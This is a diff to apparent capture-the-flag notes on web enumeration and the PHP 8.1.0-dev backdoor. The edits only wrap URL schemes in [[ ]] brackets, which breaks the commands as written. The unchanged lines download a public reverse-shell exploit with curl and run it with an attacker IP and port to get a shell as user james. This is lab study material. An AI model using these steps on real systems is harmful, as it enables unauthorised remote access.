@@ -61,7 +61,7 @@ Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds
 ```
 	- document
 - Gobuster to enumerate website if machine has 80 or 443
-	- `gobuster dir -u http://precious.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o nameGobuster.txt -t 10`
+	- `gobuster dir -u [[http]]://precious.[[htb]] -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o nameGobuster.txt -t 10`
 	```bash
 ┌──(kali㉿kali)-[~]
 └─$ gobuster dir -u http://10.10.10.242 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o knifeGobuster.txt -t 10 -x .php
@@ -176,7 +176,7 @@ else:
 - Searching GH for exploits reveals 
 - PHP 8.1.0-dev Backdoor Remote Code Execution
 	- [php-8.1.0-dev-backdoor-rce](https://github.com/flast101/php-8.1.0-dev-backdoor-rce?tab=readme-ov-file)
-	- `curl -O https://raw.githubusercontent.com/flast101/php-8.1.0-dev-backdoor-rce/refs/heads/main/revshell_php_8.1.0-dev.py`
+	- `curl -O [[https]]://raw.githubusercontent.com/flast101/php-8.1.0-dev-backdoor-rce/refs/heads/main/revshell_php_8.1.0-dev.py`
 	- `python3 revshell_php_8.1.0-dev.py <target URL> <attacker IP> <attacker PORT>`
 		- spawns reverse shell
 		- into james user 
